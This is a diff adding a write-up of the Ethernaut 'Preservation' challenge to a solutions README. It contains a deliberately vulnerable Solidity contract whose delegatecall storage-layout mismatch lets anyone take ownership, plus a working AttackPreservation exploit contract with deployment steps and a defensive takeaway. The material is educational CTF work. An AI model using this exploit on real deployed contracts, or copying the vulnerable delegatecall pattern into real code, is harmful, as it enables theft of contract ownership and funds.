@@ -14,7 +14,7 @@
 13. ~[Gatekeeper One]~
 14. ~[Gatekeeper Two]~
 15. [Naught Coin](#15-naught-coin)
-16. [Preservation](yet to update)
+16. [Preservation](#16-preservation)
 17. [Recovery](yet to update)
 18. [MagicNumber](yet to update)
 19. ~[Alien Codex]~
@@ -827,3 +827,78 @@ contract HackNaughtCoin {
 Now the balance of tokens we hold is **0**.
 ##### Takeaway from Ethernaut
 When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that `transfer` is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.
+
+# 16. Preservation
+### Challenge
+- The goal of this level is for you to claim ownership of the instance given.
+### Purpose
+Understand the risk delegate call in storage variables.
+### Contract
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Preservation {
+
+  // public library contracts 
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner; 
+  uint storedTime;
+  // Sets the function signature for delegatecall
+  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+    timeZone1Library = _timeZone1LibraryAddress; 
+    timeZone2Library = _timeZone2LibraryAddress; 
+    owner = msg.sender;
+  }
+ 
+  // set the time for timezone 1
+  function setFirstTime(uint _timeStamp) public {
+    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+
+  // set the time for timezone 2
+  function setSecondTime(uint _timeStamp) public {
+    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+
+  // stores a timestamp 
+  uint storedTime;  
+
+  function setTime(uint _time) public {
+    storedTime = _time;
+  }
+}
+```
+### Solution
+##### Explanation
+Refer [Delegation](#6-delegation) level to know about delegatecall and its risks. `Preservation` makes a delegatecall to `LibraryContract` to set `storedTime` variable, but LibraryContract doesn't maintain same storage layout as Preservation contract. Therefore delegatecall to `setTime()` will change `timeZone1Library` variable. Providing a **uint** conversion of a desired contract address to `setFirstTime()` will change the timeZone1Library. We can call set proper storage layout and method in that contract to change the `owner` by calling `setFirstTime()` again.
+##### Exploit
+```
+contract AttackPreservation {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function attack(Preservation target) external {
+        target.setFirstTime(uint256(uint160(address(this))));
+        target.setFirstTime(uint256(uint160(msg.sender)));
+        require(target.owner() == msg.sender, "Attack failed!");
+    }
+
+    function setTime(uint _addressUint) external {
+        owner = address(uint160(_addressUint));
+    }
+}
+```
+1. Deploy the above contract.
+2. Call `attack()` with `Preservation` instance address as argument.\
+(It first sets the `timeZone1Library` with attack contract address. Next `setFirstTime()` call delegates to `AttackPreservation` contract which changes the `owner` since the storage layout matched with Preservation contract.
+##### Takeaway from Ethernaut
+As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.
